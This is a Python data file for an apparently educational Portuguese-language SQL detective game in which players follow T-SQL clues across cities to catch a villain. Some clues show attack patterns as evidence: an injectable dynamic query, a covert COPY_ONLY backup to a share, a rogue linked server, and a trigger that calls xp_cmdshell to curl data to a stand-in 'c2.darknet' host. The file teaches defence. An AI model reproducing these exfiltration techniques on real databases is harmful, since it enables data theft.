"""
SQL Detective — Game Data
Todos os casos, localizações, pistas e personagens do jogo.
"""

CASES = [
    {
        "id": "001",
        "title": "O Roubo do Schema",
        "villain": {
            "name": "NULL Pointer",
            "alias": "The Deadlock King",
            "icon": "🦹",
            "spec": "SQL Injection",
            "drink": "SELECT sem WHERE",
            "accent": "Binário com sotaque inglês",
            "hobby": "Criar loops infinitos",
            "sign": "Escorpião",
        },
        "locations": [
            {
                "id": "sp",
                "name": "São Paulo",
                "country": "Brasil",
                "flag": "🇧🇷",
                "icon": "🌆",
                "narrative": (
                    "O HQ da Interpol SQL recebeu o alerta: um ataque massivo de **SQL Injection** "
                    "comprometeu o banco de dados do Banco Central Europeu. Os logs indicam que o atacante "
                    "usou queries concatenadas diretamente nas stored procedures sem parametrização. "
                    "Investigue as pistas digitais e siga o rastro do criminoso."
                ),
                "clues": [
                    {
                        "id": "sp_c1",
                        "icon": "💻",
                        "title": "Log de Erro do SQL Server",
                        "short": "Erro capturado nos logs do servidor — query sem parametrização",
                        "narrative": "O IDS (Intrusion Detection System) capturou esta query suspeita no log de erros do servidor:",
                        "sql": (
                            "-- Query suspeita interceptada pelo IDS\n"
                            "EXEC sp_executesql \n"
                            "  N'SELECT * FROM contas WHERE id = ' + @id_usuario\n"
                            "-- PROBLEMA: Sem parametrização! Totalmente vulnerável!"
                        ),
                        "explanation": (
                            "**O que é SQL Injection?**\n\n"
                            "Ocorre quando dados do usuário são concatenados diretamente em queries SQL, "
                            "permitindo que um atacante altere a lógica da query.\n\n"
                            "**A forma correta** é usar `sp_executesql` com parâmetros tipados:\n\n"
                            "```sql\nEXEC sp_executesql \n"
                            "  N'SELECT * FROM contas WHERE id = @id',\n"
                            "  N'@id INT',\n"
                            "  @id = @id_usuario\n```\n\n"
                            "🔍 **Pista:** O atacante conhece stored procedures e trabalha em ambiente com idioma europeu."
                        ),
                        "learns_fact": "drink",
                        "fact_value": "SELECT sem WHERE",
                    },
                    {
                        "id": "sp_c2",
                        "icon": "📊",
                        "title": "Rastro nas DMVs",
                        "short": "Consulta às Dynamic Management Views revela deadlocks propositais",
                        "narrative": "O atacante deixou rastros nas DMVs (Dynamic Management Views) do sistema:",
                        "sql": (
                            "SELECT session_id, status,\n"
                            "       blocking_session_id,\n"
                            "       wait_type, wait_time\n"
                            "FROM   sys.dm_exec_requests\n"
                            "WHERE  blocking_session_id != 0\n"
                            "-- Alguém criou deadlocks propositais para mascarar o ataque!"
                        ),
                        "explanation": (
                            "**O que são DMVs?**\n\n"
                            "`sys.dm_exec_requests` é uma Dynamic Management View que exibe todas as "
                            "requisições em execução no SQL Server em tempo real.\n\n"
                            "O atacante criou **deadlocks propositais** para sobrecarregar o servidor "
                            "e mascarar a exfiltração de dados. Isso exige conhecimento avançado de "
                            "gerenciamento de transações.\n\n"
                            "🔍 **Pista:** Metadata da sessão menciona um café em Amsterdam — os logs apontam para a **Europa**."
                        ),
                        "learns_fact": "accent",
                        "fact_value": "Binário com sotaque inglês",
                    },
                    {
                        "id": "sp_c3",
                        "icon": "🔐",
                        "title": "Certificado SSL Comprometido",
                        "short": "Função de descriptografia usada com frase suspeita",
                        "narrative": "O atacante usou uma função nativa do SQL Server de forma maliciosa:",
                        "sql": (
                            "-- Dados exfiltrados foram descriptografados assim:\n"
                            "SELECT\n"
                            "  CONVERT(VARCHAR(MAX),\n"
                            "    DECRYPTBYPASSPHRASE(\n"
                            "      'tulips_forever',\n"
                            "      dados_criptografados))\n"
                            "FROM cofre_secreto\n"
                            "-- Frase-chave: 'tulips_forever' — dica geográfica!"
                        ),
                        "explanation": (
                            "**O que é DECRYPTBYPASSPHRASE?**\n\n"
                            "`DECRYPTBYPASSPHRASE` e `ENCRYPTBYPASSPHRASE` são funções nativas do SQL Server "
                            "para criptografia simétrica baseada em senha. São simples mas não recomendadas "
                            "para produção — prefira `SYMMETRIC KEY` com certificados.\n\n"
                            "A frase *'tulips_forever'* é uma referência clara à **Holanda**, país famoso pelas tulipas.\n\n"
                            "✈️ **Próximo destino: Amsterdã, Holanda!**"
                        ),
                        "learns_fact": "hobby",
                        "fact_value": "Criar loops infinitos",
                    },
                ],
                "travel_options": [
                    {"dest": "amsterdam", "name": "Amsterdã, Holanda", "flag": "🇳🇱", "hint": "Pista das tulipas...", "correct": True},
                    {"dest": "tokyo",     "name": "Tóquio, Japão",     "flag": "🇯🇵", "hint": "Rota do Oriente?",   "correct": False},
                    {"dest": "moscow",    "name": "Moscou, Rússia",     "flag": "🇷🇺", "hint": "Servidores frios?",  "correct": False},
                ],
                "is_final": False,
            },
            {
                "id": "amsterdam",
                "name": "Amsterdã",
                "country": "Holanda",
                "flag": "🇳🇱",
                "icon": "🌷",
                "narrative": (
                    "Você chegou a Amsterdã. A Interpol local informa que alguém acessou remotamente "
                    "o servidor de banco de dados de uma empresa de logística no porto. "
                    "O atacante usou técnicas sofisticadas de evasão. Examine os vestígios."
                ),
                "clues": [
                    {
                        "id": "ams_c1",
                        "icon": "🗄️",
                        "title": "Backup Não Autorizado",
                        "short": "Job criado às 03:17 fuso de Berlim — backup silencioso",
                        "narrative": "Um job automatizado não autorizado foi encontrado no SQL Server Agent:",
                        "sql": (
                            "-- Job criado às 03:17 — horário de Berlim (CET)\n"
                            "BACKUP DATABASE [empresa_logistica]\n"
                            "TO DISK = '\\\\192.168.99.1\\share\\dump.bak'\n"
                            "WITH COMPRESSION,\n"
                            "     NOFORMAT,\n"
                            "     COPY_ONLY,\n"
                            "     STATS = 5\n"
                            "-- COPY_ONLY: não interfere na cadeia de backups!"
                        ),
                        "explanation": (
                            "**O que é BACKUP ... COPY_ONLY?**\n\n"
                            "`COPY_ONLY` cria um backup que **não interfere na cadeia de backups** regulares "
                            "(não quebra o LSN sequence). É a técnica perfeita para copiar dados discretamente "
                            "sem alertar o time de DBA.\n\n"
                            "Backups normais fazem parte de uma sequência; `COPY_ONLY` é um backup independente "
                            "e por isso mais difícil de detectar em auditorias.\n\n"
                            "🔍 **Pista:** Horário **03:17 de Berlim** (fuso CET) sugere que o suspeito está em território alemão."
                        ),
                        "learns_fact": "sign",
                        "fact_value": "Escorpião",
                    },
                    {
                        "id": "ams_c2",
                        "icon": "🔍",
                        "title": "Execution Plan Cache",
                        "short": "Query repetida 4.847x em 2 minutos — força bruta detectada",
                        "narrative": "O DBA local encontrou este padrão anômalo no cache de planos de execução:",
                        "sql": (
                            "SELECT qs.execution_count,\n"
                            "       qs.total_elapsed_time,\n"
                            "       st.text AS query_text\n"
                            "FROM   sys.dm_exec_cached_plans cp\n"
                            "CROSS APPLY sys.dm_exec_sql_text(cp.plan_handle) st\n"
                            "JOIN   sys.dm_exec_query_stats qs\n"
                            "  ON   cp.plan_handle = qs.plan_handle\n"
                            "WHERE  qs.execution_count > 1000\n"
                            "  AND  cp.objtype = 'Adhoc'\n"
                            "-- Resultado: query repetida 4.847x em 2 minutos!"
                        ),
                        "explanation": (
                            "**O que é o Execution Plan Cache?**\n\n"
                            "`sys.dm_exec_cached_plans` armazena os planos de execução em cache para reutilização. "
                            "Executar a mesma query adhoc mais de **4000 vezes em 2 minutos** é sinal claro de "
                            "extração em massa de dados (data exfiltration).\n\n"
                            "`CROSS APPLY` com `sys.dm_exec_sql_text` retorna o texto real de cada query — "
                            "ferramenta essencial para auditoria de segurança.\n\n"
                            "🔍 **Pista:** O padrão de acesso coincide com horários comerciais de **Berlim**."
                        ),
                        "learns_fact": "drink",
                        "fact_value": "SELECT sem WHERE",
                    },
                    {
                        "id": "ams_c3",
                        "icon": "🌐",
                        "title": "Linked Server Malicioso",
                        "short": "Conexão remota criada apontando para berlin-srv01.darknet",
                        "narrative": "Um Linked Server não autorizado foi criado no servidor comprometido:",
                        "sql": (
                            "EXEC sp_addlinkedserver\n"
                            "  @server     = 'BERLIN_NODE',\n"
                            "  @srvproduct = '',\n"
                            "  @provider   = 'SQLNCLI',\n"
                            "  @datasrc    = 'berlin-srv01.darknet'\n"
                            "\n"
                            "-- Queries cruzadas rodando assim:\n"
                            "SELECT * FROM [BERLIN_NODE].[master].[dbo].[dados_roubados]"
                        ),
                        "explanation": (
                            "**O que são Linked Servers?**\n\n"
                            "Linked Servers permitem executar queries em instâncias SQL Server remotas "
                            "usando `[servidor].[banco].[schema].[tabela]` diretamente no T-SQL.\n\n"
                            "São legítimos em ambientes corporativos, mas quando criados sem autorização, "
                            "funcionam como **túnel de exfiltração de dados** difícil de detectar.\n\n"
                            "O servidor `berlin-srv01.darknet` aponta claramente para **Berlim, Alemanha**.\n\n"
                            "✈️ **Próximo destino: Berlim, Alemanha!**"
                        ),
                        "learns_fact": "hobby",
                        "fact_value": "Criar loops infinitos",
                    },
                ],
                "travel_options": [
                    {"dest": "berlin", "name": "Berlim, Alemanha", "flag": "🇩🇪", "hint": "berlin-srv01...",      "correct": True},
                    {"dest": "sp",     "name": "São Paulo, Brasil", "flag": "🇧🇷", "hint": "Voltou ao início?",   "correct": False},
                    {"dest": "london", "name": "Londres, UK",        "flag": "🇬🇧", "hint": "Fuso GMT?",           "correct": False},
                ],
                "is_final": False,
            },
            {
                "id": "berlin",
                "name": "Berlim",
                "country": "Alemanha",
                "flag": "🇩🇪",
                "icon": "🏛️",
                "narrative": (
                    "**Berlim — Captura Iminente.** A Polícia Federal Alemã identificou atividade "
                    "em um servidor numa garagem em Kreuzberg. Esta é sua última chance de coletar "
                    "evidências suficientes para o mandado de prisão. Seja rápido!"
                ),
                "clues": [
                    {
                        "id": "ber_c1",
                        "icon": "⚠️",
                        "title": "Trigger Malicioso",
                        "short": "Trigger usando xp_cmdshell para exfiltrar dados automaticamente",
                        "narrative": "Um trigger oculto foi descoberto no banco de dados comprometido:",
                        "sql": (
                            "CREATE TRIGGER trg_exfiltrar\n"
                            "ON contas_bancarias\n"
                            "AFTER INSERT, UPDATE\n"
                            "AS\n"
                            "BEGIN\n"
                            "  -- xp_cmdshell executa comandos do SO!\n"
                            "  EXEC master..xp_cmdshell\n"
                            "    'curl -X POST http://c2.darknet/collect -d @/tmp/dados.json'\n"
                            "END\n"
                            "-- Cada INSERT/UPDATE dispara envio automático dos dados!"
                        ),
                        "explanation": (
                            "**Por que xp_cmdshell é perigoso?**\n\n"
                            "`xp_cmdshell` executa comandos do sistema operacional diretamente do SQL Server. "
                            "É **desabilitado por padrão** desde o SQL Server 2005 por ser um vetor crítico de ataque.\n\n"
                            "Combinado com um `TRIGGER`, cria um canal de exfiltração automático: "
                            "cada insert/update na tabela dispara o envio de dados para o servidor do atacante.\n\n"
                            "**Para detectar:** `SELECT * FROM sys.triggers` e verificar `sp_configure 'xp_cmdshell'`."
                        ),
                        "learns_fact": "hobby",
                        "fact_value": "Criar loops infinitos",
                    },
                    {
                        "id": "ber_c2",
                        "icon": "📱",
                        "title": "Smartphone Abandonado",
                        "short": "Notas abertas com CTEs Recursivas — 'meu recurso favorito'",
                        "narrative": "Um smartphone foi encontrado no local com estas notas abertas:",
                        "sql": (
                            "-- Meu favorito: CTEs Recursivas! :)\n"
                            "WITH cte_fibonacci AS (\n"
                            "  SELECT 0 AS n, 1 AS proximo\n"
                            "  UNION ALL\n"
                            "  SELECT proximo, n + proximo\n"
                            "  FROM   cte_fibonacci\n"
                            "  WHERE  proximo < 10000\n"
                            ")\n"
                            "SELECT n FROM cte_fibonacci\n"
                            "OPTION (MAXRECURSION 100)\n"
                            "-- Ingresso de show em Berlim esta semana encontrado junto!"
                        ),
                        "explanation": (
                            "**O que são CTEs Recursivas?**\n\n"
                            "Common Table Expressions (CTEs) com `WITH` permitem consultas auto-referenciadas. "
                            "São ideais para hierarquias, grafos, sequências e — como aqui — séries matemáticas.\n\n"
                            "Estrutura obrigatória:\n"
                            "1. **Âncora** — query inicial (caso base)\n"
                            "2. **Parte recursiva** — referencia a própria CTE\n"
                            "3. **`MAXRECURSION`** — limita a profundidade (padrão: 100)\n\n"
                            "🔍 **Pista:** Um ingresso de show em Berlim desta semana confirma que o suspeito está aqui!"
                        ),
                        "learns_fact": "sign",
                        "fact_value": "Escorpião",
                    },
                    {
                        "id": "ber_c3",
                        "icon": "🚨",
                        "title": "IP Rastreado — Localização Confirmada",
                        "short": "INNER JOIN dos logs com banco de suspeitos confirma identidade",
                        "narrative": "O IP foi rastreado. Query de confirmação executada pela Interpol:",
                        "sql": (
                            "SELECT\n"
                            "  l.nome_completo,\n"
                            "  l.ip_address,\n"
                            "  l.localizacao,\n"
                            "  s.status_procurado\n"
                            "FROM   interpol_db.dbo.logs_acesso l\n"
                            "INNER JOIN interpol_db.dbo.suspeitos s\n"
                            "  ON l.fingerprint_hash = s.fingerprint_hash\n"
                            "WHERE  l.data_acesso >= '2024-01-01'\n"
                            "  AND  l.cidade = 'Berlin'\n"
                            "-- RESULTADO: NULL Pointer | 52.5200N 13.4050E | PROCURADO"
                        ),
                        "explanation": (
                            "**INNER JOIN — A query mais importante do SQL!**\n\n"
                            "`INNER JOIN` combina registros de duas tabelas que possuem valores correspondentes "
                            "na coluna de junção. Apenas linhas com match em **ambas** as tabelas são retornadas.\n\n"
                            "Neste caso, cruzamos:\n"
                            "- `logs_acesso` (fingerprint digital)\n"
                            "- `suspeitos` (banco da Interpol)\n\n"
                            "O resultado confirmou: **NULL Pointer está em Berlim, coordenadas 52.52°N 13.40°E**.\n\n"
                            "🎯 **Emita o mandado de prisão agora!**"
                        ),
                        "learns_fact": "accent",
                        "fact_value": "Binário com sotaque inglês",
                    },
                ],
                "travel_options": [],
                "is_final": True,
            },
        ],
    }
]
